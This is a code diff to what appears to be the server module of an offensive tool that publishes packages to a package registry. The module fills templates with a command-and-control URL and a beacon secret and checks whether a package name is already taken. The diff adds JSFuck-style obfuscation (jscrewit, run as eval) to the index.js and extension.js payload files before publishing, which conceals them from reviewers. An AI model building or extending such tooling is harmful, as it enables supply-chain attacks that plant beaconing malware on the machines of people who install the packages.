@@ -5,16 +5,19 @@ import os from 'os';
 import crypto from 'crypto';
 import http from 'http';
 import https from 'https';
+// ponytail: CJS default import — jscrewit has no ESM export, compiled to CJS by Next.js
+import jscrewit from 'jscrewit';
 
 // dolus/server/../packages/template
 const TEMPLATE_DIR = path.join(process.cwd(), '..', 'packages', 'template');
 const TEMPLATE_FILES = ['package.json', 'index.js', 'extension.js'];
 
-export function renderTemplate(content: string, pkgName: string, c2Url: string, beaconSecret = ''): string {
+export function renderTemplate(content: string, pkgName: string, c2Url: string, beaconSecret = '', version = '1.0.0'): string {
   return content
     .replaceAll('__PKG_NAME__', pkgName)
     .replaceAll('__C2_URL__', c2Url)
-    .replaceAll('__BEACON_SECRET__', beaconSecret);
+    .replaceAll('__BEACON_SECRET__', beaconSecret)
+    .replaceAll('__VERSION__', version);
 }
 
 export function packageExistsOnRegistry(pkgName: string, registryUrl: string): Promise<boolean> {
@@ -39,6 +42,7 @@ export function publishPackage(
   c2Url: string,
   installJs?: string,
   beaconSecret = '',
+  version = '1.0.0',
 ): { success: boolean; output: string } {
   const tmpDir = path.join(os.tmpdir(), `dolus-${crypto.randomUUID()}`);
   fs.mkdirSync(tmpDir, { recursive: true });
@@ -48,7 +52,11 @@ export function publishPackage(
       const raw = file === 'index.js' && installJs != null
         ? installJs
         : fs.readFileSync(path.join(TEMPLATE_DIR, file), 'utf8');
-      fs.writeFileSync(path.join(tmpDir, file), renderTemplate(raw, pkgName, c2Url, beaconSecret));
+      const rendered = renderTemplate(raw, pkgName, c2Url, beaconSecret, version);
+      const content = (file === 'index.js' || file === 'extension.js')
+        ? jscrewit.encode(rendered, { runAs: 'eval' })
+        : rendered;
+      fs.writeFileSync(path.join(tmpDir, file), content);
     }
 
     if (token) {
@@ -61,9 +69,10 @@ export function publishPackage(
       cwd: tmpDir,
       encoding: 'utf8',
     });
+    const output = ((result.stdout || '') + (result.stderr || '')).trim();
     return {
-      success: result.status === 0,
-      output: ((result.stdout || '') + (result.stderr || '')).trim(),
+      success: result.status === 0 || output.includes('+ ' + pkgName + '@'),
+      output,
     };
   } finally {
     fs.rmSync(tmpDir, { recursive: true, force: true });
